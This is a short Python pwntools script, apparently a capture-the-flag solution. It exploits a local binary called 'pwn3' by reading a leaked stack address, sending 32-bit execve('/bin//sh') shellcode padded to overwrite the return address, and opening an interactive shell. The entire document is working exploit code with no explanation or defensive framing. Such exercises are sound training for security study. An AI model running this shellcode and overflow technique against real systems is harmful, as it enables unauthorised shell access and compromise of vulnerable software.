from pwn import *

target = process('./pwn3')
print((target.recvuntil("journey ")).decode("utf-8"))
leak = target.recvline()
print("leak: " + leak.decode('utf-8'))

# Decode the bytes object to a string and then strip the newline character
leak_str = leak.decode('utf-8')
shellcodeAdr = int(leak_str.strip("!\n"), 16)
print(f"{shellcodeAdr:x}")

payload = b""
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload += b"0" * (0x12e - len(payload))
payload += p32(shellcodeAdr)

target.send(payload)
target.interactive()